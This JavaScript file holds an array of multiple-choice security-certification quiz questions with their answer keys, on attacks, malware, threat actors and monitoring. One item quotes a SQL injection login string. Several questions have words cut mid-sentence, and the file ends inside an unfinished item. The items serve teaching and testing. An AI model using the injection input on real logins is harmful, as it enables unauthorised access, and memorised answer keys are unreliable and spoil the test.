const sectionOne = [
    {
      question:
        "Ahmed is a sales manager with a major insurance company. He has received an email that is encouraging him to click on a link and fill out a survey. He is suspicious of the email, but it does mention a major insurance association, and that makes him think it might be legitimate. Which of the following best describes this attack?",
      incorrectAnswers: ["Phishing", "Social engineering", "Trojan horse"],
      correctAnswer: "Spear phishing",
    },
    {
      question:
        "You are a security administrator for a medium-sized bank. You have discovered a piece of software on your bank's database server that is not supposed to be there. It appears that the software will begin deleting database files if a specific employee is terminateWhat best describes this?",
      incorrectAnswers: ["Worm", "Trojan horse", "Rootkit"],
      correctAnswer: "Logic bomb",
    },
    {
      question:
        "You are responsible for incident response at Acme Bank. The Acme Bank website has been attackeThe attacker used the login screen, but rather than enter login credentials, they entered some odd text: ' or '1' = '1. What is the best description for this attack?",
      incorrectAnswers: [
        "Cross-site scripting",
        "Cross-site request forgery",
        "ARP poisoning",
      ],
      correctAnswer: "SQL injection",
    },
    {
      question:
        "Users are complaining that they cannot connect to the wireless network. You discover that the WAPs are being subjected to a wireless attack designed to block their Wi-Fi signals. Which of the following is the best label for this attack?",
      incorrectAnswers: ["IV attack", "WPS attack", "Botnet"],
      correctAnswer: "Jamming",
    },
    {
      question:
        "Frank is deeply concerned about attacks to his company's e-commerce server. He is particularly worried about cross-site scripting and SQL injection. Which of the following would best defend against these two specific attacks?",
      incorrectAnswers: ["Encrypted web traffic", "A firewall", "An IDS"],
      correctAnswer: "Input validation",
    },
    {
      question:
        "You are responsible for network security at Acme Company. Users have been reporting that personal data is being stolen when using the wireless network. They all insist they only connect to the corporate wireless access point (AP). However, logs for the AP show that these users have not connected to it. Which of the following could best explain this situation?",
      incorrectAnswers: ["Session hijacking", "Clickjacking", "Bluejacking"],
      correctAnswer: "Rogue access point",
    },
    {
      question:
        "What type of attack depends on the attacker entering JavaScript into a text area that is intended for users to enter text that will be viewed by other users?",
      incorrectAnswers: ["SQL injection", "Clickjacking", "Bluejacking"],
      correctAnswer: "Cross-site scripting",
    },
    {
      question:
        "Rick wants to make offline brute-force attacks against his password file very difficult for attackers. Which of the following is not a common technique to make passwords harder to crack?",
      incorrectAnswers: [
        "Use of a salt",
        "Use of a pepper",
        "Use of a purpose-built password hashing algorithm",
      ],
      correctAnswer: "Encrypting password plain text using symmetric encryption",
    },
    {
      question:
        "What term is used to describe spam over Internet messaging services?",
      incorrectAnswers: ["SMSPAM", "IMSPAM", "TwoFaceTiming"],
      correctAnswer: "SPIM",
    },
    {
      question:
        "Susan is analyzing the source code for an application and discovers a pointer de-reference and returns NULL. This causes the program to attempt to read from the NULL pointer and results in a segmentation fault. What impact could this have for the application?",
      incorrectAnswers: [
        "A data breach",
        "Permissions creep",
        "Privilege escalation",
      ],
      correctAnswer: "A denial-of-service condition",
    },
    {
      question:
        "Teresa is the security manager for a mid-sized insurance company. She receives a call from law enforcement, telling her that some computers on her network participated in a massive denial-of-service (DoS) attack. Teresa is certain that none of the employees at her company would be involved in a cybercrime. What would best explain this scenario?",
      incorrectAnswers: [
        "It is a result of social engineering.",
        "The machines all have backdoors.",
        "The machines are infected with crypto-viruses.",
      ],
      correctAnswer: "The machines are bots.",
    },
    {
      question:
        "Unusual outbound network traffic, geographical irregularities, and increases in database read volumes are all examples of what key element of threat intelligence?",
      incorrectAnswers: ["Predictive analysis", "OSINT", "Threat maps"],
      correctAnswer: "Indicators of compromise",
    },
    {
      question:
        "Chris needs visibility into connection attempts through a firewall because he believes that a TCP handshake is not properly occurring. What security information and event management (SIEM) capability is best suited to troubleshooting this issue?",
      incorrectAnswers: [
        "Reviewing reports",
        "Sentiment analysis",
        "Log collection and analysis",
      ],
      correctAnswer: "Packet capture",
    },
    {
      question:
        "Chris wants to detect a potential insider threat using his security information and event management (SIEM) system. What capability best matches his needs?",
      incorrectAnswers: [
        "Sentiment analysis",
        "Log aggregation",
        "Security monitoring",
      ],
      correctAnswer: "User behavior analysis",
    },
    {
      question:
        "Chris has hundreds of systems spread across multiple locations and wants to better handle the amount of data that they create. What two technologies can help with this?",
      incorrectAnswers: [
        "Packet capture and log aggregation",
        "Security monitoring and log collectors",
        "Sentiment analysis and user behavior analysis",
      ],
      correctAnswer: "Log aggregation and log collectors",
    },
    {
      question:
        "What type of security team establishes the rules of engagement for a cybersecurity exercise?",
      incorrectAnswers: ["Blue team", "Purple team", "Red team"],
      correctAnswer: "White team",
    },
    {
      question:
        "Cynthia is concerned about attacks against an application programming interface (API) that her company provides for its customers. What should she recommend to ensure that the API is only used by customers who have paid for the service?",
      incorrectAnswers: [
        "Install and configure a firewall.",
        "Filter by IP address.",
        "Install and use an IPS.",
      ],
      correctAnswer: "Require authentication.",
    },
    {
      question:
        "What type of attack is based on sending more data to a target variable than the data can actually hold?",
      incorrectAnswers: ["Bluesnarfing", "Bluejacking", "Cross-site scripting"],
      correctAnswer: "Buffer overflow",
    },
    {
      question:
        "An email arrives telling Gurvinder that there is a limited time to act to get a software package for free and that the first 50 downloads will not have to be paid for. What social engineering principle is being used against him?",
      incorrectAnswers: ["Intimidation", "Authority", "Consensus"],
      correctAnswer: "Scarcity",
    },
    {
      question:
        "You have been asked to test your company network for security issues. The specific test you are conducting involves primarily using automated and semiautomated tools to look for known vulnerabilities with the various systems on your network. Which of the following best describes this type of test?",
      incorrectAnswers: ["Penetration test", "Security audit", "Security test"],
      correctAnswer: "Vulnerability scan",
    },
    {
      question:
        "Susan wants to reduce the likelihood of successful credential harvesting attacks via her organization's commercial websites. Which of the following is not a common prevention method aimed at stopping credential harvesting?",
      incorrectAnswers: [
        "Use of multifactor authentication",
        "User awareness training",
        "Limiting or preventing use of third-party web scripts and plugins",
      ],
      correctAnswer: "Use of complex usernames",
    },
    {
      question:
        "Greg wants to gain admission to a network which is protected by a network access control (NAC) system that recognized the hardware address of systems. How can he bypass this protection?",
      incorrectAnswers: [
        "Spoof a legitimate IP address.",
        "Conduct a denial-of-service attack against the NAC system.",
        "None of the above",
      ],
      correctAnswer: "Use MAC cloning to clone a legitimate MAC address.",
    },
    {
      question:
        "Coleen is the web security administrator for an online auction website. A small number of users are complaining that when they visit the website it does not appear to be the correct site. Coleen checks and she can visit the site without any problem, even from computers outside the network. She also checks the web server log and there is no record of those users ever connecting. Which of the following might best explain this?",
      incorrectAnswers: [
        "SQL injection",
        "Cross-site scripting",
        "Cross-site request forgery",
      ],
      correctAnswer: "Typo squatting",
    },
    {
      question:
        "The organization that Mike works in finds that one of their domains is directing traffic to a competitor's website. When Mike checks, the domain information has been changed, including the contact and other administrative details for the domain. If the domain had not expired, what has most likely occurred?",
      incorrectAnswers: [
        "DNS hijacking",
        "An on-path attack",
        "A zero-day attack",
      ],
      correctAnswer: "Domain hijacking",
    },
    {
      question:
        "Mahmoud is responsible for managing security at a large university. He has just performed a threat analysis for the network, and based on past incidents and studies of similar networks, he has determined that the most prevalent threat to his network is low-skilled attackers who wish to breach the system, simply to prove they can or for some low-level crime, such as changing a grade. Which term best describes this type of attacker?",
      incorrectAnswers: ["Hacktivist", "Amateur", "Insider"],
      correctAnswer: "Script kiddie",
    },
    {
      question: "How is phishing different from general spam?",
      incorrectAnswers: [
        "It is sent only to specific targeted individuals.",
        "It is sent via SMS.",
        "It includes malware in the message.",
      ],
      correctAnswer: "It is intended to acquire credentials or other data.",
    },
    {
      question:
        "Which of the following best describes a collection of computers that have been compromised and are being controlled from one central point?",
      incorrectAnswers: ["Zombienet", "Nullnet", "Attacknet"],
      correctAnswer: "Botnet",
    },
    {
      question:
        "Selah includes a question in her procurement request-for-proposal process that asks how long the vendor has been in business and how many existing clients the vendor has. What common issue is this practice intended to help prevent?",
      incorrectAnswers: [
        "Supply chain security issues",
        "Outsourced code development issues",
        "System integration problems",
      ],
      correctAnswer: "Lack of vendor support",
    },
    {
      question:
        "John is conducting a penetration test of a client's network. He is currently gathering information from sources such as archive.org, netcraft.com, social media, and information websites. What best describes this stage?",
      incorrectAnswers: [
        "Active reconnaissance",
        "Initial exploitation",
        "Pivot",
      ],
      correctAnswer: "Passive reconnaissance",
    },
    {
      question:
        "Alice wants to prevent SSRF attacks. Which of the following will not be helpful for preventing them?",
      incorrectAnswers: [
        "Blocking hostnames like 127.0.01 and localhost",
        "Blocking sensitive URLs like /admin",
        "Applying whitelist-based input filters",
      ],
      correctAnswer: "Removing all SQL code from submitted HTTP queries",
    },
    {
      question:
        "What type of attack is based on entering fake entries into a target network's domain name server?",
      incorrectAnswers: ["ARP poisoning", "XSS poisoning", "CSRF poisoning"],
      correctAnswer: "DNS poisoning",
    },
    {
      question:
        "Frank has been asked to conduct a penetration test of a small bookkeeping firm. For the test, he has only been given the company name, the domain name for their website, and the IP address of their gateway router. What best describes this type of test?",
      incorrectAnswers: [
        "A known environment test",
        "External test",
        "Threat test",
      ],
      correctAnswer: "An unknown environment test",
    },
    {
      question:
        "You work for a security company that performs penetration testing for clients. You are conducting a test of an e-commerce company. You discover that after compromising the web server, you can use the web server to launch a second attack into the company's internal network. What best describes this?",
      incorrectAnswers: [
        "Internal attack",
        "Known environment testing",
        "Unknown environment testing",
      ],
      correctAnswer: "A pivot",
    },
    {
      question:
        "While investigating a malware outbreak on your company network, you discover something very odThere is a file that has the same name as a Windows system DLL, and it even has the same API interface, but it handles input very differently, in a manner to help compromise the system, and it appears that applications have been attaching to this file, rather than the real system DLL. What best describes this?",
      incorrectAnswers: ["Trojan horse", "Backdoor", "Refactoring"],
      correctAnswer: "Shimming",
    },
    {
      question:
        "Which of the following capabilities is not a key part of a SOAR (security orchestration, automation, and response) tool?",
      incorrectAnswers: [
        "Threat and vulnerability management",
        "Security incident response",
        "Security operations automation",
      ],
      correctAnswer: "Automated malware analysis",
    },
    {
      question:
        "John discovers that email from his company's email servers is being blocked because of spam that was sent from a compromised account. What type of lookup can he use to determine what vendors like McAfee and Barracuda have classified his domain as?",
      incorrectAnswers: ["An nslookup", "A tcpdump", "A SMTP whois"],
      correctAnswer: "A domain reputation lookup",
    },
    {
      question:
        "Frank is a network administrator for a small college. He discovers that several machines on his network are infected with malware. That malware is sending a flood of packets to a target external to the network. What best describes this attack?",
      incorrectAnswers: ["SYN flood", "Botnet", "Backdoor"],
      correctAnswer: "DDoS",
    },
    {
      question:
        "Why is SSL stripping a particular danger with open Wi-Fi networks?",
      incorrectAnswers: [
        "WPA2 is not secure enough to prevent this.",
        "Open hotspots can be accessed by any user.",
        "802.11ac is insecure and traffic can be redirected.",
      ],
      correctAnswer:
        "Open hotspots do not assert their identity in a secure way.",
    },
    {
      question:
        "A sales manager at your company is complaining about slow performance on his computer. When you thoroughly investigate the issue, you find spyware on his computer. He insists that the only thing he has downloaded recently was a freeware stock trading application. What would best explain this situation?",
      incorrectAnswers: ["Logic bomb", "Rootkit", "Macro virus"],
      correctAnswer: "Trojan horse",
    },
    {
      question:
        "When phishing attacks are so focused that they target a specific high-ranking or important individual, they are called what?",
      incorrectAnswers: ["Spear phishing", "Targeted phishing", "Phishing"],
      correctAnswer: "Whaling",
    },
    {
      question:
        "What type of threat actors are most likely to have a profit motive for their malicious activities?",
      incorrectAnswers: ["State actors", "Script kiddies", "Hacktivists"],
      correctAnswer: "Criminal syndicates",
    },
    {
      question:
        "One of your users cannot recall the password for their laptop. You want to recover that password for them. You intend to use a tool/technique that is popular with hackers, and it consists of searching tables of precomputed hashes to recover the passworWhat best describes this?",
      incorrectAnswers: ["Backdoor", "Social engineering", "Dictionary attack"],
      correctAnswer: "Rainbow table",
    },
    {
      question:
        "What risk is commonly associated with a lack of vendor support for a product, such as an outdated version of a device?",
      incorrectAnswers: [
        "Improper data storage",
        "Lack of available documentation",
        "System integration and configuration issues",
      ],
      correctAnswer: "Lack of patches or updates",
    },
    {
      question:
        "You have noticed that when in a crowded area, you sometimes get a stream of unwanted text messages. The messages end when you leave the areWhat describes this attack?",
      incorrectAnswers: ["Bluesnarfing", "Evil twin", "Rogue access point"],
      correctAnswer: "Bluejacking",
    },
    {
      question:
        "Dennis uses an on-path attack to cause a system to send HTTPS traffic to his system and then forwards it to the actual server the traffic is intended for. What type of password attack can he conduct with the data he gathers if he captures all the traffic from a login form?",
      incorrectAnswers: [
        "A pass-the-hash attack",
        "A SQL injection attack",
        "A cross-site scripting attack",
      ],
      correctAnswer: "A plain-text password attack",
    },
    {
      question:
        "Someone has been rummaging through your company's trash bins seeking to find documents, diagrams, or other sensitive information that has been thrown out. What is this called?",
      incorrectAnswers: [
        "Trash diving",
        "Social engineering",
        "Trash engineering",
      ],
      correctAnswer: "Dumpster diving",
    },
    {
      question:
        "Louis is investigating a malware incident on one of the computers on his network. He has discovered unknown software that seems to be opening a port, allowing someone to remotely connect to the computer. This software seems to have been installed at the same time as a small shareware application. Which of the following best describes this malware?",
      incorrectAnswers: ["Worm", "Logic bomb", "Rootkit"],
      correctAnswer: "RAT",
    },
    {
      question:
        "Jared is responsible for network security at his company. He has discovered behavior on one computer that certainly appears to be a virus. He has even identified a file he thinks might be the virus. However, using three separate antivirus programs, he finds that none can detect the file. Which of the following is most likely to be occurring?",
      incorrectAnswers: [
        "The computer has a RAT.",
        "The computer has a worm.",
        "The computer has a rootkit.",
      ],
      correctAnswer: "The computer has a zero-day exploit.",
    },
    {
      question:
        "Which of the following is not a common means of attacking RFID badges?",
      incorrectAnswers: ["Data capture", "Spoofing", "Denial-of-service"],
      correctAnswer: "Birthday attacks",
    },
    {
      question:
        "Your wireless network has been breacheIt appears the attacker modified a portion of data used with the stream cipher and used this to expose wirelessly encrypted datWhat is this attack called?",
      incorrectAnswers: ["Evil twin", "Rogue WAP", "WPS attack"],
      correctAnswer: "IV attack",
    },
    {
      question:
        "The company that Scott works for has experienced a data breach, and the personal information of thousands of customers has been exposeWhich of the following impact categories is not a concern as described in this scenario?",
      incorrectAnswers: ["Financial", "Reputation", "Data loss"],
      correctAnswer: "Availability loss",
    },
    {
      question:
        "What type of attack exploits the trust that a website has for an authenticated user to attack that website by spoofing requests from the trusted user?",
      incorrectAnswers: ["Cross-site scripting", "Bluejacking", "Evil twin"],
      correctAnswer: "Cross-site request forgery",
    },
    {
      question:
        "What purpose does a fusion center serve in cyberintelligence activities?",
      incorrectAnswers: [
        "It combines security technologies to create new, more powerful tools.",
        "It generates power for the local community in a secure way.",
        "It separates information by classification ratings to avoid accidental distribution.",
      ],
      correctAnswer:
        "It promotes information sharing between agencies or organizations.",
    },
    {
      question: "CVE is an example of what type of feed?",
      incorrectAnswers: [
        "A threat intelligence feed",
        "A critical infrastructure listing feed",
        "A critical virtualization exploits feed",
      ],
      correctAnswer: "A vulnerability feed",
    },
    {
      question: "What type of attack is a birthday attack?",
      incorrectAnswers: [
        "A social engineering attack",
        "A network denial-of-service attack",
        "A TCP/IP protocol attack",
      ],
      correctAnswer: "A cryptographic attack",
    },
    {
      question:
        "Juanita is a network administrator for Acme Company. Some users complain that they keep getting dropped from the network. When Juanita checks the logs for the wireless access point (WAP), she finds that a deauthentication packet has been sent to the WAP from the users' IP addresses. What seems to be happening here?",
      incorrectAnswers: [
        "Problem with users' Wi-Fi configuration",
        "Session hijacking",
        "Backdoor attack",
      ],
      correctAnswer: "Disassociation attack",
    },
    {
      question:
        "John has discovered that an attacker is trying to get network passwords by using software that attempts a number of passwords from a list of common passwords. What type of attack is this?",
      incorrectAnswers: ["Rainbow table", "Brute force", "Session hijacking"],
      correctAnswer: "Dictionary",
    },
    {
      question:
        "You are a network security administrator for a bank. You discover that an attacker has exploited a flaw in OpenSSL and forced some connections to move to a weak cipher suite version of TLS, which the attacker could breach. What type of attack was this?",
      incorrectAnswers: [
        "Disassociation attack",
        "Session hijacking",
        "Brute force",
      ],
      correctAnswer: "Downgrade attack",
    },
    {
      question:
        "When an attacker tries to find an input value that will produce the same hash as a password, what type of attack is this?",
      incorrectAnswers: ["Rainbow table", "Brute force", "Session hijacking"],
      correctAnswer: "Collision attack",
    },
    {
      question:
        "Fares is the network security administrator for a company that creates advanced routers and switches. He has discovered that his company's networks have been subjected to a series of advanced attacks over a period of time. What best describes this attack?",
      incorrectAnswers: ["DDoS", "Brute force", "Disassociation attack"],
      correctAnswer: "APT",
    },
    {
      question:
        "What type of information is phishing not commonly intended to acquire?",
      incorrectAnswers: [
        "Passwords",
        "Credit card numbers",
        "Personal information",
      ],
      correctAnswer: "Email addresses",
    },
    {
      question:
        "John is running an IDS on his network. Users sometimes report that the IDS flags legitimate traffic as an attack. What describes this?",
      incorrectAnswers: ["False negative", "False trigger", "False flag"],
      correctAnswer: "False positive",
    },
    {
      question:
        "Scott discovers that malware has been installed on one of the systems he is responsible for. Shortly afterward passwords used by the user that the system is assigned to are discovered to be in use by attackers. What type of malicious program should Scott look for on the compromised system?",
      incorrectAnswers: ["A rootkit", "A worm", "None of the above"],
      correctAnswer: "A keylogger",
    },
    {
      question:
        "You are performing a penetration test of your company's network. As part of the test, you will be given a login with minimal access and will attempt to gain administrative access with this account. What is this called?",
      incorrectAnswers: ["Session hijacking", "Root grabbing", "Climbing"],
      correctAnswer: "Privilege escalation",
    },
    {
      question:
        "Matt discovers that a system on his network is sending hundreds of Ethernet frames to the switch it is connected to, with each frame containing a different source MAC address. What type of attack has he discovered?",
      incorrectAnswers: ["Etherspam", "Hardware spoofing", "MAC hashing"],
      correctAnswer: "MAC flooding",
    },
    {
      question: "Spyware is an example of what type of malware?",
      incorrectAnswers: ["Trojan", "RAT", "Ransomware"],
      correctAnswer: "PUP",
    },
    {
      question:
        "Mary has discovered that a web application used by her company does not always handle multithreading properly, particularly when multiple threads access the same variable. This could allow an attacker who discovered this vulnerability to exploit it and crash the server. What type of error has Mary discovered?",
      incorrectAnswers: [
        "Buffer overflow",
        "Logic bomb",
        "Improper error handling",
      ],
      correctAnswer: "Race conditions",
    },
    {
      question:
        "An attacker is trying to get access to your network. He is sending users on your network a link to a new game with a hacked license code program. However, the game files also include software that will give the attacker access to any machine that it is installed on. What type of attack is this?",
      incorrectAnswers: ["Rootkit", "Spyware", "Boot sector virus"],
      correctAnswer: "Trojan horse",
    },
    {
      question:
        "While conducting a penetration test, Annie scans for systems on the network she has gained access to. She discovers another system within the same network that has the same accounts and user types as the one she is on. Since she already has a valid user account on the system she has already accessed, she is able to log in to it. What type of technique is this?",
      incorrectAnswers: [
        "Privilege escalation",
        "Privilege retention",
        "Vertical movement",
      ],
      correctAnswer: "Lateral movement",
    },
    {
      question:
        "Amanda scans a Red Hat Linux server that she believes is fully patched and discovers that the Apache version on the server is reported as vulnerable to an exploit from a few months ago. When she checks to see if she is missing patches, Apache is fully patcheWhat has occurred?",
      incorrectAnswers: [
        "An automatic update failure",
        "A false negative",
        "An Apache version mismatch",
      ],
      correctAnswer: "A false positive",
    },
    {
      question:
        "When a program has variables, especially arrays, and does not check the boundary values before inputting data, what attack is the program vulnerable to?",
      incorrectAnswers: ["XSS", "CSRF", "Logic bomb"],
      correctAnswer: "Buffer overflow",
    },
    {
      question:
        "Tracy is concerned that the software she wants to download may not be trustworthy, so she searches for it and finds many postings claiming that the software is legitimate. If she installs the software and later discovers it is malicious and that malicious actors have planted those reviews, what principle of social engineering have they used?",
      incorrectAnswers: ["Scarcity", "Familiarity", "Trust"],
      correctAnswer: "Consensus",
    },
    {
      question:
        "Which of the following best describes malware that will execute some malicious activity when a particular condition is met (i.e., if the condition is met, then executed)?",
      incorrectAnswers: [
        "Boot sector virus",
        "Buffer overflow",
        "Sparse infector virus",
      ],
      correctAnswer: "Logic bomb",
    },
    {
      question:
        "What term describes using conversational tactics as part of a social engineering exercise to extract information from targets?",
      incorrectAnswers: ["Pretexting", "Impersonation", "Intimidation"],
      correctAnswer: "Elicitation",
    },
    {
      question: "Telnet, RSH, and FTP are all examples of what?",
      incorrectAnswers: [
        "File transfer protocols",
        "Core protocols",
        "Open ports",
      ],
      correctAnswer: "Unsecure protocols",
    },
    {
      question:
        "Scott wants to determine where an organization's wireless network can be accessed from. What testing techniques are his most likely options?",
      incorrectAnswers: [
        "OSINT and active scans",
        "Social engineering and active scans",
        "OSINT and war driving",
      ],
      correctAnswer: "War driving and war flying",
    },
    {
      question:
        "Gerald is a network administrator for a small financial services company. Users are reporting odd behavior that appears to be caused by a virus on their machines. After isolating the machines that he believes are infected, Gerald analyzes them. He finds that all the infected machines received an email purporting to be from accounting, with an Excel spreadsheet, and the users opened the spreadsheet. What is the most likely issue on these machines?",
      incorrectAnswers: ["A boot sector virus", "A Trojan horse", "A RAT"],
      correctAnswer: "A macro virus",
    },
    {
      question:
        "Your company has hired an outside security firm to perform various tests of your network. During the vulnerability scan, you will provide that company with logins for various systems (i.e., database server, application server, web server, etc.) to aid in their scan. What best describes this?",
      incorrectAnswers: [
        "A known environment test",
        "A gray-box test",
        "An intrusive scan",
      ],
      correctAnswer: "A credentialed scan",
    },
    {
      question:
        "Which of the following is commonly used in a distributed denial-of-service (DDoS) attack?",
      incorrectAnswers: ["Phishing", "Adware", "Trojan"],
      correctAnswer: "Botnet",
    },
    {
      question:
        "Amanda discovers that a member of her organization's staff has installed a remote access Trojan on their accounting software server and has been accessing it remotely. What type of threat has she discovered?",
      incorrectAnswers: ["Zero-day", "Misconfiguration", "Weak encryption"],
      correctAnswer: "Insider threat",
    },
    {
      question:
        "Postings from Russian agents during the 2016 U.S. presidential campaign to Facebook and Twitter are an example of what type of effort?",
      incorrectAnswers: [
        "Impersonation",
        "Asymmetric warfare",
        "A watering hole attack",
      ],
      correctAnswer: "A social media influence campaign",
    },
    {
      question:
        "Juan is responsible for incident response at a large financial institution. He discovers that the company Wi-Fi has been breacheThe attacker used the same login credentials that ship with the wireless access point (WAP). The attacker was able to use those credentials to access the WAP administrative console and make changes. Which of the following best describes what caused this vulnerability to exist?",
      incorrectAnswers: [
        "Improperly configured accounts",
        "Untrained users",
        "Failure to patch systems",
      ],
      correctAnswer: "Using default settings",
    },
    {
      question:
        "Elizabeth is investigating a network breach at her company. She discovers a program that was able to execute code within the address space of another process by using the target process to load a specific library. What best describes this attack?",
      incorrectAnswers: ["Logic bomb", "Session hijacking", "Buffer overflow"],
      correctAnswer: "DLL injection",
    },
    {
      question:
        "Which of the following threat actors is most likely to be associated with an advanced persistent threat (APT)?",
      incorrectAnswers: ["Hacktivists", "Script kiddies", "Insider threats"],
      correctAnswer: "State actors",
    },
    {
      question:
        "What is the primary difference between an intrusive and a nonintrusive vulnerability scan?",
      incorrectAnswers: [
        "An intrusive scan is a penetration test.",
        "A nonintrusive scan is just a document check.",
        "A nonintrusive scan won't find most vulnerabilities.",
      ],
      correctAnswer: "An intrusive scan could potentially disrupt operations.",
    },
    {
      question:
        "Your company outsourced development of an accounting application to a local programming firm. After three months of using the product, one of your administrators discovers that the developers have inserted a way to log in and bypass all security and authentication. What best describes this?",
      incorrectAnswers: ["Logic bomb", "Trojan horse", "Rootkit"],
      correctAnswer: "Backdoor",
    },
    {
      question:
        "Daryl is investigating a recent breach of his company's web server. The attacker used sophisticated techniques and then defaced the website, leaving messages that were denouncing the company's public policies. He and his team are trying to determine the type of actor who most likely committed the breach. Based on the information provided, who was the most likely threat actor?",
      incorrectAnswers: ["A script", "A nation-state", "Organized crime"],
      correctAnswer: "Hacktivists",
    },
    {
      question:
        "What two techniques are most commonly associated with a pharming attack?",
      incorrectAnswers: [
        "Phishing many users and harvesting email addresses from them",
        "Phishing many users and harvesting many passwords from them",
        "Spoofing DNS server IP addresses or modifying the hosts file on a PC",
      ],
      correctAnswer:
        "Modifying the hosts file on a PC or exploiting a DNS vulnerability on a trusted DNS server",
    },
    {
      question:
        "Angela reviews the authentication logs for her website and sees attempts from many different accounts using the same set of passwords. What is this attack technique called?",
      incorrectAnswers: [
        "Brute forcing",
        "Limited login attacks",
        "Account spinning",
      ],
      correctAnswer: "Password spraying",
    },
    {
      question:
        "When investigating breaches and attempting to attribute them to specific threat actors, which of the following is not one of the indicators of an APT?",
      incorrectAnswers: [
        "Long-term access to the target",
        "Sophisticated attacks",
        "The attack is sustained over time.",
      ],
      correctAnswer: "The attack comes from a foreign IP address.",
    },
    {
      question:
        "Charles discovers that an attacker has used a vulnerability in a web application that his company runs and has then used that exploit to obtain root privileges on the web server. What type of attack has he discovered?",
      incorrectAnswers: [
        "Cross-site scripting",
        "A SQL injection",
        "A race condition",
      ],
      correctAnswer: "Privilege escalation",
    },
    {
      question:
        "What type of attack uses a second wireless access point (WAP) that broadcasts the same SSID as a legitimate access point, in an attempt to get users to connect to the attacker's WAP?",
      incorrectAnswers: ["IP spoofing", "Trojan horse", "Privilege escalation"],
      correctAnswer: "Evil twin",
    },
    {
      question: "Which of the following best describes a zero-day vulnerability?",
      incorrectAnswers: [
        "A vulnerability that has not yet been breached",
        "A vulnerability that can be quickly exploited (i.e., in zero days)",
        "A vulnerability that will give the attacker brief access (i.e., zero days)",
      ],
      correctAnswer: "A vulnerability that the vendor is not yet aware of",
    },
    {
      question:
        'What type of attack involves adding an expression or phrase such as adding "SAFE" to mail headers?',
      incorrectAnswers: ["Pretexting", "Phishing", "SQL injection"],
      correctAnswer: "Prepending",
    },
    {
      question:
        "Charles wants to ensure that his outsourced code development efforts are as secure as possible. Which of the following is not a common practice to ensure secure remote code development?",
      incorrectAnswers: [
        "Ensure developers are trained on secure coding techniques.",
        "Set defined acceptance criteria for code security.",
        "Test code using automated and manual security testing systems.",
      ],
      correctAnswer: "Audit all underlying libraries used in the code.",
    },
    {
      question:
        "You have discovered that there are entries in your network's domain name server that point legitimate domains to unknown and potentially harmful IP addresses. What best describes this type of attack?",
      incorrectAnswers: ["A backdoor", "An APT", "A Trojan horse"],
      correctAnswer: "DNS poisoning",
    },
    {
      question: "Spyware is an example of what type of malicious software?",
      incorrectAnswers: ["A CAT", "A worm", "A Trojan"],
      correctAnswer: "A PUP",
    },
    {
      question:
        "What best describes an attack that attaches some malware to a legitimate program so that when the user installs the legitimate program, they inadvertently install the malware?",
      incorrectAnswers: ["Backdoor", "RAT", "Polymorphic virus"],
      correctAnswer: "Trojan horse",
    },
    {
      question:
        "Which of the following best describes software that will provide the attacker with remote access to the victim's machine but that is wrapped with a legitimate program in an attempt to trick the victim into installing it?",
      incorrectAnswers: ["Backdoor", "Trojan horse", "Macro virus"],
      correctAnswer: "RAT",
    },
    {
      question:
        "What process typically occurs before card cloning attacks occur?",
      incorrectAnswers: [
        "A brute-force attack",
        "A rainbow table attack",
        "A birthday attack",
      ],
      correctAnswer: "A skimming attack",
    },
    {
      question:
        "Which of the following is an attack that seeks to attack a website, based on the website's trust of an authenticated user?",
      incorrectAnswers: ["XSS", "Buffer overflow", "RAT"],
      correctAnswer: "XSRF",
    },
    {
      question:
        "Valerie is responsible for security testing applications in her company. She has discovered that a web application, under certain conditions, can generate a memory leak. What type of attack would this leave the application vulnerable to?",
      incorrectAnswers: ["Backdoor", "SQL injection", "Buffer overflow"],
      correctAnswer: "DoS",
    },
    {
      question:
        "The mobile game that Jack has spent the last year developing has been released, and malicious actors are sending traffic to the server that runs it to prevent it from competing with other games in the App Store. What type of denial-of-service attack is this?",
      incorrectAnswers: [
        "A network DDoS",
        "An operational technology DDoS",
        "A GDoS",
      ],
      correctAnswer: "An application DDoS",
    },
    {
      question:
        "Charles has been tasked with building a team that combines techniques from attackers and defenders to help protect his organization. What type of team is he building?",
      incorrectAnswers: ["A red team", "A blue team", "A white team"],
      correctAnswer: "A purple team",
    },
    {
      question:
        "Mike is a network administrator with a small financial services company. He has received a pop-up window that states his files are now encrypted and he must pay .5 bitcoins to get them decrypteHe tries to check the files in question, but their extensions have changed, and he cannot open them. What best describes this situation?",
      incorrectAnswers: [
        "Mike's machine has a rootkit.",
        "Mike's machine has a logic bomb.",
        "Mike's machine has been the target of whaling.",
      ],
      correctAnswer: "Mike's machine has ransomware.",
    },
    {
      question:
        "When a multithreaded application does not properly handle various threads accessing a common value, and one thread can change the data while another thread is relying on it, what flaw is this?",
      incorrectAnswers: ["Memory leak", "Buffer overflow", "Integer overflow"],
      correctAnswer: "Time of check/time of use",
    },
    {
      question:
        "Acme Company is using smartcards that use near-field communication (NFC) rather than needing to be swipeThis is meant to make physical access to secure areas more secure. What vulnerability might this also create?",
      incorrectAnswers: ["Tailgating", "IP spoofing", "Race conditions"],
      correctAnswer: "Eavesdropping",
    },
    {
      question:
        "Rick believes that Windows systems in his organization are being targeted by fileless viruses. If he wants to capture artifacts of their infection process, which of the following options is most likely to provide him with a view into what they are doing?",
      incorrectAnswers: [
        "Reviewing full-disk images of infected machines",
        "Disabling the administrative user account",
        "Analyzing Windows crash dump files",
      ],
      correctAnswer: "Turning on PowerShell logging",
    },
    {
      question:
        "John is responsible for physical security at a large manufacturing plant. Employees all use a smartcard in order to open the front door and enter the facility. Which of the following is a common way attackers would circumvent this system?",
      incorrectAnswers: ["Phishing", "Spoofing the smartcard", "RFID spoofing"],
      correctAnswer: "Tailgating",
    },
    {
      question:
        "Adam wants to download lists of malicious or untrustworthy IP addresses and domains using STIX and TAXII. What type of service is he looking for?",
      incorrectAnswers: ["A vulnerability feed", "A hunting feed", "A rule feed"],
      correctAnswer: "A threat feed",
    },
    {
      question:
        "During an incident investigation, Naomi notices that a second keyboard was plugged into a system in a public area of her company's building. Shortly after that event, the system was infected with malware, resulting in a data breach. What should Naomi look for in her inperson investigation?",
      incorrectAnswers: [
        "A Trojan horse download",
        "A worm",
        "None of the above",
      ],
      correctAnswer: "A malicious USB cable or drive",
    },
    {
      question:
        "You are responsible for incident response at Acme Corporation. You have discovered that someone has been able to circumvent the Windows authentication process for a specific network application. It appears that the attacker took the stored hash of the password and sent it directly to the backend authentication service, bypassing the application. What type of attack is this?",
      incorrectAnswers: ["Hash spoofing", "Evil twin", "Shimming"],
      correctAnswer: "Pass the hash",
    },
    {
      question:
